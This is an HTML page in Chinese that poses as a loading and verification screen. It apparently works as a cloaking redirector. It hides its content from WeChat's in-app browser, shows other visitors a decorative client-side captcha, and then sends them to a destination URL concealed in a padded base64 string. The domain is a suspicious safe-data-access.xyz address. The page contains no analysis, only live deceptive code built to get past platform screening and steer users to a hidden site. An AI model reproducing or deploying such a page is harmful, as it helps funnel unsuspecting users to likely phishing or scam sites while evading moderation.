<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>加载中</title>
  <style>
    body {
      margin: 0;
      background-color: #f2f4f8;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      color: #333;
      text-align: center;
      padding: 100px 20px;
    }

    .hidden { display: none; }

    .card {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      margin: 0 auto;
      padding: 40px 30px;
    }

    .lock-icon {
      font-size: 64px;
      color: #e74c3c;
      margin-bottom: 20px;
    }

    .message {
      font-size: 18px;
      margin-bottom: 25px;
    }

    .code-area {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    canvas {
      border-radius: 5px;
      background-color: #eee;
      cursor: pointer;
    }

    .refresh-btn {
      background-color: #e0e0e0;
      color: #333;
      border: none;
      padding: 6px 10px;
      font-size: 14px;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.2s;
    }

    .refresh-btn:hover {
      background-color: #ccc;
    }

    input[type="text"] {
      padding: 12px;
      font-size: 16px;
      width: 180px;
      border: 1px solid #ccc;
      border-radius: 5px;
      margin-bottom: 20px;
      text-align: center;
      transition: all 0.2s;
    }

    button {
      padding: 12px 25px;
      font-size: 16px;
      background-color: #3498db;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background 0.2s;
    }

    button:hover {
      background-color: #2980b9;
    }

    #error {
      color: #e74c3c;
      margin-top: 10px;
      font-size: 14px;
    }

    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }

    .shake {
      animation: shake 0.3s ease;
    }
  </style>
</head>
<body>

  <div id="wechat-warning" class="card hidden">
    <div class="lock-icon">🔒</div>
    <div class="message">请使用手机浏览器访问本页面</div>
  </div>

  <div id="verify-box" class="card hidden">
    <div class="lock-icon">🔒</div>
    <div class="message">请输入确认码继续</div>
    <div class="code-area">
      <canvas id="captchaCanvas" width="120" height="40" title="更换确认码"></canvas>
      <button class="refresh-btn" onclick="drawCaptcha()">换一个</button>
    </div>
    <input type="text" id="code-input" maxlength="4" placeholder="确认码">
    <br>
    <button onclick="checkCode()">确定</button>
    <div id="error"></div>
  </div>

  <script>
    function isWX() {
      return /micromessenger/i.test(navigator.userAgent);
    }

    let code = "";

    function generateCode() {
      return Math.floor(1000 + Math.random() * 9000).toString();
    }

    function drawCaptcha() {
      const canvas = document.getElementById("captchaCanvas");
      const ctx = canvas.getContext("2d");
      code = generateCode();

      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#fff";
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      for (let i = 0; i < code.length; i++) {
        const fontSize = 22 + Math.random() * 6;
        ctx.font = `${fontSize}px Arial`;
        ctx.fillStyle = `rgb(${Math.random()*120}, ${Math.random()*120}, ${Math.random()*120})`;
        const x = 10 + i * 25;
        const y = 28 + Math.random() * 5;
        ctx.fillText(code[i], x, y);
      }

      for (let i = 0; i < 4; i++) {
        ctx.strokeStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.4)`;
        ctx.beginPath();
        ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
        ctx.stroke();
      }

      for (let i = 0; i < 20; i++) {
        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.6)`;
        ctx.beginPath();
        ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1 + Math.random()*1.5, 0, 2 * Math.PI);
        ctx.fill();
      }
    }

    const cfgData = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA==";
    const prefix = 5, suffix = 4;

    function decodeData(str) {
      try {
        const raw = atob(str);
        return raw.slice(prefix, raw.length - suffix);
      } catch {
        return null;
      }
    }

    function checkCode() {
      const val = document.getElementById("code-input").value.trim();
      if (val === code) {
        document.getElementById("error").innerText = "";
        const cdnPath = decodeData(cfgData);
        if (cdnPath) {
          location.assign(cdnPath);
        } else {
          document.getElementById("error").innerText = "载入失败，请稍后重试";
        }
      } else {
        document.getElementById("error").innerText = "验证码错误，请重试";
        const input = document.getElementById("code-input");
        input.classList.add("shake");
        drawCaptcha();
        setTimeout(() => input.classList.remove("shake"), 300);
      }
    }

    window.onload = () => {
      if (isWX()) {
        document.getElementById("wechat-warning").classList.remove("hidden");
      } else {
        document.getElementById("verify-box").classList.remove("hidden");
        drawCaptcha();
      }
    };

    document.getElementById("captchaCanvas").addEventListener("click", drawCaptcha);
  </script>
</body>
</html>
